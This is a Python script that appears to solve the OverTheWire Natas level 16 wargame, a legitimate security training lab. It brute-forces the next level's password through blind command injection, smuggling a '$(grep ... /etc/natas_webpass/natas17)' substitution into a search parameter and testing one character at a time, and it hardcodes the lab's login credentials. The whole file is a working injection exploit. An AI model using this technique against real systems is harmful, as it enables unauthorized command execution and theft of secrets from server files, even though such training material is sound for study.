import requests
from requests.auth import HTTPBasicAuth

words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
url = "http://natas16.natas.labs.overthewire.org/"
natas17_pw = ""

n = 0
while True:
    for ch in words:
        n += 1
        temp_pw = natas17_pw + ch
        print(f"Try {n} times: {temp_pw}")

        payload = f"^$(grep -o ^{temp_pw} /etc/natas_webpass/natas17)A"
        params = {"needle": payload, "submit": "Search"}
        response = requests.get(
            url, auth=HTTPBasicAuth(username, password), params=params
        )

        result = response.text
        start = result.find("<pre>\n") + len("<pre>\n")
        end = result.find("</pre>")
        result_list = [x for x in result[start:end].split("\n")]

        if result_list[0] != "African":
            natas17_pw = temp_pw
            break

    if len(natas17_pw) == 32:
        print("Finish!")
        break
